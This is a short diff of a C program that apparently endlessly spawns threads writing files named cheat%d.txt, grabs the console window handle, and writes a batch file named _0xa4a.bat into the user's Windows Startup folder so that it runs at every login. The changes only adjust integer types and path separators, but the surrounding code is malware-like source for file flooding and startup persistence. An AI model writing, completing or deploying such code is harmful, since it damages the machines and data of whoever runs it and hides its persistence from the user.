@@ -13,7 +13,7 @@
 #endif
 
 int main(int argc, char *argv[]){
-	int n_file;
+	long long int n_file;
 	srand(time(0));
 	pthread_t multi_thread;			// multi thread
 	HWND myWindow = GetConsoleWindow();
@@ -28,7 +28,7 @@ int main(int argc, char *argv[]){
 
 
 void *infinity(void *param){
-	int n_file = (int)param;
+	long long int n_file = (long long int)param;
 	FILE *handle;
 	char filename[MAX];
 	sprintf(filename, "cheat%d.txt", n_file);
@@ -47,7 +47,7 @@ void bat(){
 
 	strcat(percorso_corrente, "cd ");
 	strcat(enviroment, getenv("APPDATA"));
-	strcat(enviroment, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_0xa4a.bat");
+	strcat(enviroment, "/Microsoft/Windows/Start Menu/Programs/Startup/_0xa4a.bat");
 	FILE *batch = fopen(enviroment, "w");
 	strcat(percorso_corrente, "/");	
 	fprintf(batch, "%s", "@echo off\n");
